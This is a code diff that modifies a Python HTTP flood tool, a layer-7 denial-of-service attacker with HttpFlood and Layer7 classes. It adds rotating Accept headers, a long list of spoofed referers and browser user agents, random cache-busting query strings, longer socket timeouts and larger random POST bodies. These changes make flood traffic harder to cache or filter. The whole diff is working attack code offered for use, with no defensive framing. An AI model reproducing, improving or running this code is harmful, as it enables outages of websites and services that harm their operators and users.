@@ -19,14 +19,22 @@ ctx: SSLContext = create_default_context(cafile=where())
 ctx.check_hostname = False
 ctx.verify_mode = CERT_NONE
 
-google_agents = [
-    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
-    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
-    "+http://www.google.com/bot.html)) "
-    "Googlebot/2.1 (+http://www.google.com/bot.html)",
-    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
-]
+acceptall = [
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept-Encoding: gzip, deflate\r\n",
+		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
+		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nAccept-Encoding: gzip, deflate\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept-Charset: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Language: en-US,en;q=0.5\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nAccept-Encoding: gzip, deflate, br\r\n",
+	]
 tor2webs = [
     'onion.city', 'onion.cab', 'onion.direct', 'onion.sh', 'onion.link', 'onion.ws',
     'onion.pet', 'onion.rip', 'onion.plus', 'onion.top', 'onion.si', 'onion.ly',
@@ -44,6 +52,88 @@ referers = [
     "https://www.twitter.com/",
     "https://www.youtube.com/",
     "https://www.instagram.com/",
+    "https://www.baidu.com/",
+    "https://www.yandex.ru/",
+    "https://www.yahoo.com/",
+    "https://www.whatsapp.com/",
+    "https://www.amazon.com/",
+    "https://www.pinterest.com/",
+    "https://www.reddit.com/",
+    "https://www.wikipedia.org/",
+    "https://www.linkedin.com/",
+    "https://www.microsoft.com/",
+    "https://www.netflix.com/",
+    "https://www.twitch.tv/",
+    "https://www.microsoft.com/",
+    "https://www.en.wikipedia.org/",
+    "https://www.google.co.in/",
+    "https://www.google.co.jp/",
+    "https://www.google.co.uk/",
+    "https://www.google.com.br/",
+    "https://www.google.com.tr/",
+    "https://www.google.ca/",
+    "https://www.google.es/",
+    "https://www.google.de/",
+    "https://www.google.fr/",
+    "https://www.google.it/",
+    "https://www.google.pl/",
+    "https://www.google.nl/",
+    "https://www.google.com.au/",
+    "https://www.google.com.tw/",
+    "https://www.google.com.hk/",
+    "https://www.google.com.mx/",
+    "https://www.google.com.ar/",
+    "https://www.google.com.sa/",
+    "https://www.google.com.eg/",
+    "https://www.google.co.id/",
+    "https://www.google.co.th/",
+    "https://www.google.co.za/",
+    "https://www.google.com.ng/",
+    "https://www.google.com.pk/",
+    "https://www.google.com.vn/",
+    "https://www.google.com.ph/",
+    "https://www.google.com.pe/",
+    "https://www.google.com.co/",
+    "https://www.google.com.cl/",
+    "https://www.google.com.ec/",
+    "https://www.google.com.bo/",
+    "https://www.google.com.py/",
+    "https://www.google.com.uy/",
+    "https://www.google.com.ve/",
+    "https://www.google.com.do/",
+    "https://www.google.com.gt/",
+    "https://www.google.com.cr/",
+    "https://www.google.com.pa/",
+    "https://www.google.com.sv/",
+    "https://www.google.com.hn/",
+    "https://www.google.com.ni/",
+    "https://www.google.com.pr/",
+    "https://www.google.com.cu/",
+    "https://www.bing.com/",
+    "https://www.duckduckgo.com/",
+    "https://www.aol.com/",
+    "https://www.ask.com/",
+    "https://www.blekko.com/",
+    "https://www.wolframalpha.com/",
+    "https://www.ecosia.org/",
+    "https://www.startpage.com/",
+    "https://www.qwant.com/",
+    "https://www.searchencrypt.com/",
+    "https://www.gibiru.com/",
+    "https://www.disconnect.me/",
+    "https://www.yippy.com/",
+    "https://www.swisscows.com/",
+    "https://www.lukol.com/",
+    "https://www.metager.de/",
+    "https://www.gigablast.com/",
+    "https://www.oscobo.co.uk/",
+    "https://www.google.com/search?q="
+]
+
+USER_AGENTS: List[str] = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
+    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
 ]
 
 class HttpFlood(Thread):
@@ -84,6 +174,8 @@ class HttpFlood(Thread):
         self._target = target
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
+        self._useragents = list(useragents)
+        self._referers = list(referers)
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
             self._raw_target = (self._host, (self._target.port or 80))
@@ -128,7 +220,8 @@ class HttpFlood(Thread):
         if proxies:
             self._proxies = list(proxies)
 
-        if not useragents:
+        if useragents is None:
+            useragents = USER_AGENTS
             useragents: List[str] = [
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ',
                 'Safari/537.36',
@@ -188,21 +281,7 @@ class HttpFlood(Thread):
                 'Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1',
             ]
         self._useragents = list(useragents)
-        self._req_type = self.getMethodType(method)
-        self._defaultpayload = "%s %s HTTP/%s\r\n" % (self._req_type,
-                                                      target.raw_path_qs, randchoice(['1.0', '1.1', '1.2']))
-        self._payload = (self._defaultpayload +
-                         'Accept-Encoding: gzip, deflate, br\r\n'
-                         'Accept-Language: en-US,en;q=0.9\r\n'
-                         'Cache-Control: max-age=0\r\n'
-                         'Connection: keep-alive\r\n'
-                         'Sec-Fetch-Dest: document\r\n'
-                         'Sec-Fetch-Mode: navigate\r\n'
-                         'Sec-Fetch-Site: none\r\n'
-                         'Sec-Fetch-User: ?1\r\n'
-                         'Sec-Gpc: 1\r\n'
-                         'Pragma: no-cache\r\n'
-                         'Upgrade-Insecure-Requests: 1\r\n')
+
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -227,11 +306,18 @@ class HttpFlood(Thread):
                 f'Real-IP: {spoof}\r\n')
 
     def generate_payload(self, other: str = None) -> bytes:
-        return str.encode((self._payload +
-                           f"Host: {self._target.authority}\r\n" +
-                           self.randHeadercontent +
-                           (other if other else "") +
-                           "\r\n"))
+        payload = (
+            f'{self._method} {self._target.path_qs}?{ProxyTools.Random.rand_str(6)}={ProxyTools.Random.rand_str(6)} HTTP/1.1\r\n'
+            f'Host: {self._target.host}\r\n'
+            'Connection: keep-alive\r\n'
+            'Accept-Encoding: gzip, deflate, br\r\n'
+            'Accept: */*\r\n'
+            f'User-Agent: {randchoice(self._useragents)}\r\n'
+            f'{randchoice(acceptall)}'
+            f'Referer: {randchoice(self._referers)}{ProxyTools.Random.rand_str(6)}\r\n'
+            '\r\n'
+        )
+        return str.encode(payload + (other if other else ""))
 
     def open_connection(self, host=None) -> socket:
         if self._proxies:
@@ -240,7 +326,7 @@ class HttpFlood(Thread):
             sock = socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.settimeout(.9)
+        sock.settimeout(3)
         sock.connect(host or self._raw_target)
 
         if self._target.scheme.lower() == "https":
@@ -268,10 +354,10 @@ class HttpFlood(Thread):
 
     def POST(self) -> None:
         payload: bytes = self.generate_payload(
-            ("Content-Length: 44\r\n"
+            ("Content-Length: 512\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(32))[:-2]
+             '{"data": "%s"}') % ProxyTools.Random.rand_str(500))
         s = None
         with  suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -644,7 +730,9 @@ class Layer7:
                  duration: int,
                  event: Event,
                  config: dict,
-                 proxies: set):
+                 proxies: set,
+                 user_agents: set,
+                 referers: set):
         self.target = target
         self.method = method
         self.duration = duration
@@ -652,8 +740,8 @@ class Layer7:
         self.config = config
         self.proxies = proxies
         self.rpc = config.get("rpc", 1)
-        self.user_agents = set(config.get("user_agents", google_agents))
-        self.referers = set(config.get("referers", referers))
+        self.user_agents = user_agents
+        self.referers = referers
 
     def run(self):
         http_flood_instance = HttpFlood(
